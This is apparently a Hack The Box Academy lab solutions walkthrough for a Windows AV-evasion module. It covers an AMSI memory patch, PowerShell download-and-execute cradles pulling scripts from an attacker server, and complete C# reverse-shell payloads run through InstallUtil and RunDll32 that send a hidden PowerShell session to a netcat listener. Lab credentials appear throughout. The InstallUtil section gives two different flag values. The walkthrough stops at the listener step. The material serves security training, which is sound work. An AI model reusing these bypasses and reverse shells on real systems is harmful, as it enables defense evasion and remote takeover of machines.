$lpflOldProtect = 0;
[Kernel32]::VirtualProtect($lpAddress, [UIntPtr]::new($patch.Length), 0x40, [ref]$lpflOldProtect) | Out-Null;
$marshal = [System.Runtime.InteropServices.Marshal];
$marshal::Copy($patch, 0, $lpAddress, $patch.Length);
[Kernel32]::VirtualProtect($lpAddress, [UIntPtr]::new($patch.Length), $lpflOldProtect, [ref]$lpflOldProtect) | Out-Null;
```

Students then need to start an HTTP web server to host the PowerShell scripts:

Code: shell

```shell
python3 -m http.server PWNPO
```

```
┌─[us-academy-1]─[10.10.14.196]─[htb-ac-413848@htb-rf61dbbvqw]─[~]
└──╼ [★]$ python3 -m http.server 8080

Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

Afterward, students need to launch the target machine in the `Open-Source Software` section and connect to it via `xfreerdp`, using the credentials `alpha:FGQxrLW2`:

Code: shell

```shell
xfreerdp /v:STMIP /u:alpha /p:FGQxrLW2 /dynamic-resolution
```

```
┌─[us-academy-1]─[10.10.15.103]─[htb-ac-413848@htb-nd54e2lcog]─[~]
└──╼ [★]$ xfreerdp /v:10.129.229.213 /u:alpha /p:FGQxrLW2 /dynamic-resolution

[03:41:44:013] [4454:4455] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[03:41:44:013] [4454:4455] [WARN][com.freerdp.crypto] - CN = EVASION-TARGET
[03:41:44:013] [4454:4455] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[03:41:44:013] [4454:4455] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[03:41:44:013] [4454:4455] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[03:41:44:013] [4454:4455] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.229.213:3389) 
[03:41:44:013] [4454:4455] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[03:41:44:013] [4454:4455] [ERROR][com.freerdp.crypto] - Common Name (CN):
[03:41:44:013] [4454:4455] [ERROR][com.freerdp.crypto] - 	EVASION-TARGET
[03:41:44:013] [4454:4455] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.229.213:3389 (RDP-Server):
	Common Name: EVASION-TARGET
	Subject:     CN = EVASION-TARGET
	Issuer:      CN = EVASION-TARGET
	Thumbprint:  c9:b7:9f:fe:76:d9:43:94:6e:5c:68:7d:40:93:83:ea:a2:0d:c0:7c:f4:94:73:9c:e7:51:49:24:cc:df:c2:f8
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
<SNIP>
```

Subsequently, students need to download the files from the HTTP web server and use `Invoke-Expression` to execute them:

Code: powershell

```powershell
$webClient = New-Object Net.WebClient;
$webClient.DownloadString('http://PWNIP:PWNPO/AMSIBypass.ps1') | IEX;
$webClient.DownloadString('http://PWNIP:PWNPO/Invoke-Seatbelt.ps1') | IEX;
```

```
PS C:\Users\alpha> $webClient = New-Object Net.WebClient;
PS C:\Users\alpha> $webClient.DownloadString('http://PWNIP:PWNPO/AMSIBypass.ps1') | IEX;
PS C:\Users\alpha> $webClient.DownloadString('http://PWNIP:PWNPO/Invoke-Seatbelt.ps1') | IEX;
```

At last, when using the `AMSIProviders` command of `Seatbelt`, students will discover that the value of the GUID is `{2781761E-28E0-4109-99FE-B9D127C57AFE}`:

Code: powershell

```powershell
Invoke-Seatbelt AMSIProviders
```

```
PS C:\Users\alpha> Invoke-Seatbelt AMSIProviders

                        %&&@@@&&
                        &&&&&&&%%%,                       #&&@@@@@@%%%%%%###############%
                        &%&   %&%%                        &////(((&%%%%%#%################//((((###%%%%%%%%%%%%%%%
%%%%%%%%%%%######%%%#%%####%  &%%**#                      @////(((&%%%%%%######################(((((((((((((((((((
#%#%%%%%%%#######%#%%#######  %&%,,,,,,,,,,,,,,,,         @////(((&%%%%%#%#####################(((((((((((((((((((
#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&%%%%%%%######################(#(((#(#((((((((((
#####%%%####################  &%%......  ...   ..         @////(((&%%%%%%%###############%######((#(#(####((((((((
#######%##########%#########  %%%......  ...   ..         @////(((&%%%%%#########################(#(#######((#####
###%##%%####################  &%%...............          @////(((&%%%%%%%%##############%#######(#########((#####
#####%######################  %%%..                       @////(((&%%%%%%%################
                        &%&   %%%%%      Seatbelt         %////(((&%%%%%%%%#############*
                        &%%&&&%%%%%        v1.2.2         ,(((&%%%%%%%%%%%%%%%%%,
                         #%%%%##,

====== AMSIProviders ======

  GUID                           : {2781761E-28E0-4109-99FE-B9D127C57AFE}
  ProviderPath                   : "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24030.9-0\MpOav.dll"

[*] Completed collection in 0.024 seconds
```

Answer: `{2781761E-28E0-4109-99FE-B9D127C57AFE}`

# User Account Control

## Question 1

### "Research the "UAC Bypass via ComputerDefault Execution Hijack". What is the full path of the binary which attackers target when using this technique?"

After searching for "UAC Bypass via ComputerDefault Execution Hijack" using any search engine, students will find within [T1548.002 - Abuse Elevation Control Mechanism: Bypass User Account Control](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.002/T1548.002.md#atomic-test-5---bypass-uac-using-computerdefaults-powershell) in the [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) repository that the full path of the binary targeted by attackers when performing `UAC Bypass` using `ComputerDefault` is `C:\Windows\System32\ComputerDefaults.exe`:

![[HTB Solutions/CAPE/z. images/1da26446554b886b64eb38904dfe46f4_MD5.jpg]]

Answer: `C:\Windows\System32\ComputerDefaults.exe`

# AppLocker

## Question 1

### "Enumerate the local AppLocker policy. What is the full path of the one script which Beta is explicitly allowed to run?"

After spawning the target machine, students need to connect to it with `xfreerdp` using the credentials `alpha:FGQxrLW2`:

Code: shell

```shell
xfreerdp /v:STMIP /u:alpha /p:FGQxrLW2 /dynamic-resolution
```

```
┌─[us-academy-1]─[10.10.15.103]─[htb-ac-413848@htb-gbb28rybvr]─[~]
└──╼ [★]$ xfreerdp /v:10.129.179.20 /u:alpha /p:FGQxrLW2 /dynamic-resolution

[01:01:19:344] [4078:4079] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-413848/.config/freerdp
[01:01:19:344] [4078:4079] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-413848/.config/freerdp/certs]
[01:01:19:344] [4078:4079] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-413848/.config/freerdp/server]
[01:01:19:490] [4078:4079] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[01:01:19:490] [4078:4079] [WARN][com.freerdp.crypto] - CN = EVASION-TARGET
[01:01:19:490] [4078:4079] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[01:01:19:490] [4078:4079] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[01:01:19:490] [4078:4079] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[01:01:19:490] [4078:4079] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.179.20:3389) 
[01:01:19:490] [4078:4079] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[01:01:19:490] [4078:4079] [ERROR][com.freerdp.crypto] - Common Name (CN):
[01:01:19:490] [4078:4079] [ERROR][com.freerdp.crypto] - 	EVASION-TARGET
[01:01:19:490] [4078:4079] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.179.20:3389 (RDP-Server):
	Common Name: EVASION-TARGET
	Subject:     CN = EVASION-TARGET
	Issuer:      CN = EVASION-TARGET
	Thumbprint:  c9:b7:9f:fe:76:d9:43:94:6e:5c:68:7d:40:93:83:ea:a2:0d:c0:7c:f4:94:73:9c:e7:51:49:24:cc:df:c2:f8
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
<SNIP>
```

Subsequently, students need to use the PowerShell `Get-AppLockerPolicy` Cmdlet along with the `-Effective` and `-Xml` flags:

Code: powershell

```powershell
Get-AppLockerPolicy -Effective -Xml
```

```
PS C:\Users\alpha> Get-AppLockerPolicy -Effective -Xml 

<AppLockerPolicy Version="1"><RuleCollection Type="Appx" EnforcementMode="Enabled"><FilePublisherRule Id="a9e18c21-ff8f-43cf-b9fc-db40eed693ba" Name="(Default Rule) All signed packaged apps" Description="Allows members of the Everyone group to run packaged apps that are signed." UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePublisherCondition PublisherName="*" ProductName="*" BinaryName="*"><BinaryVersionRange LowSection="0.0.0.0" HighSection="*" /></FilePublisherCondition></Conditions></FilePublisherRule></RuleCollection><RuleCollection Type="Dll" EnforcementMode="NotConfigured" />[SNIP]
```

When analyzing the rule named 'Allow Beta to run 2.3.ps1', students will discover that the path of the script that `Beta` can run is `%OSDRIVE%\Users\beta\Desktop\2.3.ps1`:

Code: xml

```xml
<FilePathRule Id="0fc74ea7-9218-44d2-b95b-ac8fa6713186" Name="Allow Beta to run 2.3.ps1" Description="" UserOrGroupSid="S-1-5-21-1281964002-1479956090-3874817217-1001" Action="Allow">
	<Conditions>
		<FilePathCondition Path="%OSDRIVE%\Users\beta\Desktop\2.3.ps1" />
	</Conditions>
</FilePathRule>
```

Answer: `%OSDRIVE%\Users\beta\Desktop\2.3.ps1`

# LOLBAS: InstallUtil

## Question 1

### "Prepare and upload a payload to "C:\\Alpha\\InstallUtil". After placing the file, wait up to a minute; another user will scan the file, and then they will execute the following command: "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U <YOUR FILE>". Your goal is to read the flag from their desktop."

After spawning the target machine of the `Introduction` section, students first need to connect to it with `xfreerdp` using the credentials `Administrator:Eva$i0n!`, mapping the home folder of `Pwnbox` to a share on 'EVASION-DEV' (named 'SharedDrive' here):

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /p:'Eva$i0n!' /dynamic-resolution /drive:SharedDrive,.
```

```
┌─[us-academy-1]─[10.10.15.103]─[htb-ac-413848@htb-kp8w8pm5ck]─[~]
└──╼ [★]$ xfreerdp /v:10.129.229.169 /u:Administrator /p:'Eva$i0n!' /dynamic-resolution /drive:SharedDrive,.

[21:01:15:129] [3777:3778] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-413848/.config/freerdp
[21:01:15:129] [3777:3778] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-413848/.config/freerdp/certs]
[21:01:15:129] [3777:3778] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-413848/.config/freerdp/server]
[21:01:16:298] [3777:3778] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[21:01:16:298] [3777:3778] [WARN][com.freerdp.crypto] - CN = EVASION-DEV
[21:01:16:298] [3777:3778] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[21:01:16:298] [3777:3778] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[21:01:16:298] [3777:3778] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[21:01:16:298] [3777:3778] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.229.169:3389) 
[21:01:16:298] [3777:3778] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[21:01:16:298] [3777:3778] [ERROR][com.freerdp.crypto] - Common Name (CN):
[21:01:16:298] [3777:3778] [ERROR][com.freerdp.crypto] - 	EVASION-DEV
[21:01:16:298] [3777:3778] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.229.169:3389 (RDP-Server):
	Common Name: EVASION-DEV
	Subject:     CN = EVASION-DEV
	Issuer:      CN = EVASION-DEV
	Thumbprint:  60:69:d3:56:9c:ba:ab:fc:43:40:73:01:31:17:fd:f1:8b:7e:3c:c5:64:c6:d9:b5:fa:12:13:30:4d:d5:48:42
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
<SNIP>
```

Subsequently, students need to create a `Console App (.NET Framework)` project using Visual Studio 2022, and then add `System.Configuration.Install.dll` as a project reference:

![[HTB Solutions/CAPE/z. images/100c1cdd5db36521608ae2030760ae9a_MD5.jpg]]

![[HTB Solutions/CAPE/z. images/18992620966ad8f8060e1d0457cc475d_MD5.jpg]]

Students then need to develop C# code (as provided in the section) that abuses `InstallUtil` to establish a reverse shell, utilizing either the custom-built reverse shell, 'RShell', provided in the `Dynamic Analysis` section or [micr0\_shell](https://github.com/senzee1984/micr0_shell) (the former approach will be used):

Code: csharp

```csharp
using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Runtime.InteropServices;

public class Program
{
    public static void Main(string[] args)
    {
    }
}

[System.ComponentModel.RunInstaller(true)]
public class A : System.Configuration.Install.Installer
{
    [DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

    [DllImport("kernel32")]
    private static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, UInt32 flNewProtect, out UInt32 lpflOldProtect);

    [DllImport("kernel32")]
    private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

    [DllImport("kernel32")]
    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    private static StreamWriter streamWriter;

    public override void Uninstall(System.Collections.IDictionary savedState)
    {
        try
        {
            // Connect to <IP> on <Port>/TCP
            TcpClient client = new TcpClient();
            client.Connect("PWNIP", PWNPO);

            // Set up input/output streams
            Stream stream = client.GetStream();
            StreamReader streamReader = new StreamReader(stream);
            streamWriter = new StreamWriter(stream);

            // Define a hidden PowerShell (-ep bypass -nologo) process with STDOUT/ERR/IN all redirected
            Process p = new Process();
            p.StartInfo.FileName = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
            p.StartInfo.Arguments = "-ep bypass -nologo";
            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardError = true;
            p.StartInfo.RedirectStandardInput = true;
            p.OutputDataReceived += new DataReceivedEventHandler(HandleDataReceived);
            p.ErrorDataReceived += new DataReceivedEventHandler(HandleDataReceived);

            // Start process and begin reading output
            p.Start();
            p.BeginOutputReadLine();
            p.BeginErrorReadLine();

            // Re-route user-input to STDIN of the PowerShell process
            // If we see the user sent "exit", we can stop
            string userInput = "";
            while (!userInput.Equals("exit"))
            {
                userInput = streamReader.ReadLine();
                p.StandardInput.WriteLine(userInput);
            }

            // Wait for PowerShell to exit (based on user-inputted exit), and close the process
            p.WaitForExit();
            client.Close();
        }
        catch (Exception) { }
    }
    private static void HandleDataReceived(object sender, DataReceivedEventArgs e)
    {
        if (e.Data != null)
        {
            streamWriter.WriteLine(e.Data);
            streamWriter.Flush();
        }
    }
}
```

Before building the solution (using the keystrokes `Ctrl + Shift + B`), students should switch to the `Release` solution configuration (rather than `Debug`):

![[HTB Solutions/CAPE/z. images/4023f075f8b603166dd09a227f2674a9_MD5.jpg]]

Afterwards, students need to copy the compiled executable in the `Release` folder to the shared drive on `Pwnbox`:

Code: powershell

```powershell
copy C:\Tools\NotMalware\NotMalware\bin\Release\NotMalware.exe \\TSCLIENT\SharedDrive
```

```
PS C:\Users\Administrator> copy C:\Tools\NotMalware\NotMalware\bin\Release\NotMalware.exe \\TSCLIENT\SharedDrive
```

Students then need to launch the target machine in the `LOLBAS: InstallUtil` section and connect to it via `xfreerdp`, using the credentials `alpha:FGQxrLW2`, and map the home folder of `Pwnbox` to a share on 'EVASION-TARGET' (named 'SharedDrive' here):

Code: shell

```shell
xfreerdp /v:STMIP /u:alpha /p:FGQxrLW2 /dynamic-resolution /drive:SharedDrive,.
```

```
┌─[us-academy-1]─[10.10.15.103]─[htb-ac-413848@htb-nd54e2lcog]─[~]
└──╼ [★]$ xfreerdp /v:10.129.229.213 /u:alpha /p:FGQxrLW2 /dynamic-resolution /drive:SharedDrive,.

[03:41:44:013] [4454:4455] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[03:41:44:013] [4454:4455] [WARN][com.freerdp.crypto] - CN = EVASION-TARGET
[03:41:44:013] [4454:4455] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[03:41:44:013] [4454:4455] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[03:41:44:013] [4454:4455] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[03:41:44:013] [4454:4455] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.229.213:3389) 
[03:41:44:013] [4454:4455] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[03:41:44:013] [4454:4455] [ERROR][com.freerdp.crypto] - Common Name (CN):
[03:41:44:013] [4454:4455] [ERROR][com.freerdp.crypto] - 	EVASION-TARGET
[03:41:44:013] [4454:4455] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.229.213:3389 (RDP-Server):
	Common Name: EVASION-TARGET
	Subject:     CN = EVASION-TARGET
	Issuer:      CN = EVASION-TARGET
	Thumbprint:  c9:b7:9f:fe:76:d9:43:94:6e:5c:68:7d:40:93:83:ea:a2:0d:c0:7c:f4:94:73:9c:e7:51:49:24:cc:df:c2:f8
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
<SNIP>
```

Subsequently, students need to copy over the compiled executable from the shared folder on `Pwnbox` to `C:\Alpha\InstallUtil`:

Code: powershell

```powershell
copy \\TSCLIENT\SharedDrive\NotMalware.exe C:\Alpha\InstallUtil
```

```
PS C:\Users\alpha> copy \\TSCLIENT\SharedDrive\NotMalware.exe C:\Alpha\InstallUtil
```

Afterward, students need to start an `nc` listener on the same `PWNPO` hardcoded in the C# reverse shell executable:

Code: shell

```shell
nc -nvlp PWNPO
```

```
┌─[us-academy-1]─[10.10.15.103]─[htb-ac-413848@htb-kp8w8pm5ck]─[~]
└──╼ [★]$ nc -nvlp 9001

Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
```

After waiting for a minute, students will notice that a reverse shell has been successfully established on the `nc` listener as the user `gamma`:

```
Ncat: Connection from 10.129.229.213.
Ncat: Connection from 10.129.229.213:55778.
whoami

PS C:\> whoami
evasion-target\gamma
```

At last, when reading the contents of the file `C:\Users\gamma\Desktop\flag.txt`, students will attain the flag `634fb69bb4a3fe27bf1a5170e1b11e40`:

Code: powershell

```powershell
more C:\Users\gamma\Desktop\flag.txt
```

```
more C:\Users\gamma\Desktop\flag.txt

PS C:\> more C:\Users\gamma\Desktop\flag.txt
c0aaa7685c2a8040c3140a3f905e2486
```

Answer: `c0aaa7685c2a8040c3140a3f905e2486`

# LOLBAS: RunDll32

## Question 1

### "Prepare and upload a payload to "C:\\Alpha\\RunDll32". After placing the file, wait up to a minute; another user will scan the file, and then they will execute the following command: "C:\\Windows\\System32\\rundll32.exe <YOUR FILE>,DllMain". Your goal is to read the flag from their desktop."

After spawning the target machine of the `Introduction` section, students first need to connect to it with `xfreerdp` using the credentials `Administrator:Eva$i0n!`, mapping the home folder of `Pwnbox` to a share on 'EVASION-DEV' (named 'SharedDrive' here):

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /p:'Eva$i0n!' /dynamic-resolution /drive:SharedDrive,.
```

```
┌─[us-academy-1]─[10.10.15.122]─[htb-ac-413848@htb-qzxhxgji9h]─[~]
└──╼ [★]$ xfreerdp /v:10.129.229.169 /u:Administrator /p:'Eva$i0n!' /dynamic-resolution /drive:SharedDrive,.

[21:01:15:129] [3777:3778] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-413848/.config/freerdp
[21:01:15:129] [3777:3778] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-413848/.config/freerdp/certs]
[21:01:15:129] [3777:3778] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-413848/.config/freerdp/server]
[21:01:16:298] [3777:3778] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[21:01:16:298] [3777:3778] [WARN][com.freerdp.crypto] - CN = EVASION-DEV
[21:01:16:298] [3777:3778] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[21:01:16:298] [3777:3778] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[21:01:16:298] [3777:3778] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[21:01:16:298] [3777:3778] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.229.169:3389) 
[21:01:16:298] [3777:3778] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[21:01:16:298] [3777:3778] [ERROR][com.freerdp.crypto] - Common Name (CN):
[21:01:16:298] [3777:3778] [ERROR][com.freerdp.crypto] - 	EVASION-DEV
[21:01:16:298] [3777:3778] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.229.169:3389 (RDP-Server):
	Common Name: EVASION-DEV
	Subject:     CN = EVASION-DEV
	Issuer:      CN = EVASION-DEV
	Thumbprint:  60:69:d3:56:9c:ba:ab:fc:43:40:73:01:31:17:fd:f1:8b:7e:3c:c5:64:c6:d9:b5:fa:12:13:30:4d:d5:48:42
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
<SNIP>
```

Subsequently, students need to navigate to `Project` ---> `Manage NuGet Packages...`:

![[HTB Solutions/CAPE/z. images/35927480e769a6f7062bad2b9a5c726e_MD5.jpg]]

Then, inside the `NuGet Package Manager`, students need to click on the `Settings` (gear) icon:

![[HTB Solutions/CAPE/z. images/50ef75b0032c3802e1ca7aeea912e679_MD5.jpg]]

Students need to uncheck the first two checkboxes only to have `Hack The Box` as the packages source:

![[HTB Solutions/CAPE/z. images/a0eadd99b1e03d515dec1e9b94a74ab9_MD5.jpg]]

Subsequently, students need to install the `DllExport` `NuGet` package:

![[HTB Solutions/CAPE/z. images/65ff7535cd33ca8498cc607da44714aa_MD5.jpg]]

When prompted by `DllExport` to apply changes, students need to check the 'Installed' checkbox and choose 'Install':

![[HTB Solutions/CAPE/z. images/326c462321ef09269201813c138f72b4_MD5.jpg]]

Afterward, students need to choose 'Reload All':

![[HTB Solutions/CAPE/z. images/b2682224522233b593847e5fc44ce106_MD5.jpg]]

Students then need to develop C# code (as provided in the section) that establishes a reverse shell, utilizing the custom-built reverse shell, 'RShell', provided in the `Dynamic Analysis`, decorating the function that implements it with the `[DllExport()]` attribute:

Code: csharp

```csharp
using System.Diagnostics;
using System;
using System.IO;
using System.Net.Sockets;

namespace NotMalware
{
    internal class Program
    {
        private static StreamWriter streamWriter;

        [DllExport("DllMain")]
        public static void DllMain()
        {
            try
            {
                // Connect to <IP> on <Port>/TCP
                TcpClient client = new TcpClient();
                client.Connect("PWNIP", PWNPO);

                // Set up input/output streams
                Stream stream = client.GetStream();
                StreamReader streamReader = new StreamReader(stream);
                streamWriter = new StreamWriter(stream);

                // Define a hidden PowerShell (-ep bypass -nologo) process with STDOUT/ERR/IN all redirected
                Process p = new Process();
                p.StartInfo.FileName = "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe";
                p.StartInfo.Arguments = "-ep bypass -nologo";
                p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.RedirectStandardError = true;
                p.StartInfo.RedirectStandardInput = true;
                p.OutputDataReceived += new DataReceivedEventHandler(HandleDataReceived);
                p.ErrorDataReceived += new DataReceivedEventHandler(HandleDataReceived);

                // Start process and begin reading output
                p.Start();
                p.BeginOutputReadLine();
                p.BeginErrorReadLine();

                // Re-route user-input to STDIN of the PowerShell process
                // If we see the user sent "exit", we can stop
                string userInput = "";
                while (!userInput.Equals("exit"))
                {
                    userInput = streamReader.ReadLine();
                    p.StandardInput.WriteLine(userInput);
                }

                // Wait for PowerShell to exit (based on user-inputted exit), and close the process
                p.WaitForExit();
                client.Close();
            }
            catch (Exception) { }
        }

        private static void HandleDataReceived(object sender, DataReceivedEventArgs e)
        {
            if (e.Data != null)
            {
                streamWriter.WriteLine(e.Data);
                streamWriter.Flush();
            }
        }
    }
}
```

Before building the solution (using the keystrokes `Ctrl + Shift + B`), students should switch to the `Release` solution configuration (rather than `Debug`):

![[HTB Solutions/CAPE/z. images/1479c80dd603569729e84d5fd4252060_MD5.jpg]]

Because the PowerShell used is the 32-bit version, i.e., `C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe`, students need to copy the compiled `x86` `dll` file to the shared drive on `Pwnbox`:

Code: powershell

```powershell
copy C:\Tools\NotMalware\NotMalware\bin\Release\x86\NotMalware.dll \\TSCLIENT\SharedDrive
```

```
PS C:\Users\Administrator> copy C:\Tools\NotMalware\NotMalware\bin\Release\x86\NotMalware.dll \\TSCLIENT\SharedDrive
```

Students then need to launch the target machine in the `LOLBAS: RunDll32` section and connect to it via `xfreerdp`, using the credentials `alpha:FGQxrLW2`, and map the home folder of `Pwnbox` to a share on 'EVASION-TARGET' (named 'SharedDrive' here):

Code: shell

```shell
xfreerdp /v:STMIP /u:alpha /p:FGQxrLW2 /dynamic-resolution /drive:SharedDrive,.
```

```
┌─[us-academy-1]─[10.10.15.103]─[htb-ac-413848@htb-nd54e2lcog]─[~]
└──╼ [★]$ xfreerdp /v:10.129.229.213 /u:alpha /p:FGQxrLW2 /dynamic-resolution /drive:SharedDrive,.

[03:41:44:013] [4454:4455] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[03:41:44:013] [4454:4455] [WARN][com.freerdp.crypto] - CN = EVASION-TARGET
[03:41:44:013] [4454:4455] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[03:41:44:013] [4454:4455] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[03:41:44:013] [4454:4455] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[03:41:44:013] [4454:4455] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.229.213:3389) 
[03:41:44:013] [4454:4455] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[03:41:44:013] [4454:4455] [ERROR][com.freerdp.crypto] - Common Name (CN):
[03:41:44:013] [4454:4455] [ERROR][com.freerdp.crypto] - 	EVASION-TARGET
[03:41:44:013] [4454:4455] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.229.213:3389 (RDP-Server):
	Common Name: EVASION-TARGET
	Subject:     CN = EVASION-TARGET
	Issuer:      CN = EVASION-TARGET
	Thumbprint:  c9:b7:9f:fe:76:d9:43:94:6e:5c:68:7d:40:93:83:ea:a2:0d:c0:7c:f4:94:73:9c:e7:51:49:24:cc:df:c2:f8
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
<SNIP>
```

Subsequently, students need to copy over the compiled `dll` file from the shared folder on `Pwnbox` to `C:\Alpha\RunDll32`:

Code: powershell

```powershell
copy \\TSCLIENT\SharedDrive\NotMalware.dll C:\Alpha\RunDll32
```

```
PS C:\Users\alpha> copy \\TSCLIENT\SharedDrive\NotMalware.dll C:\Alpha\RunDll32
```

Afterward, students need to start an `nc` listener on the same `PWNPO` hardcoded in the compiled `dll`:

Code: shell

```shell
nc -nvlp PWNPO
```

```
┌─[us-academy-1]─[10.10.15.103]─[htb-ac-413848@htb-vkwctcnhnq]─[~]
└──╼ [★]$ nc -nvlp 9001

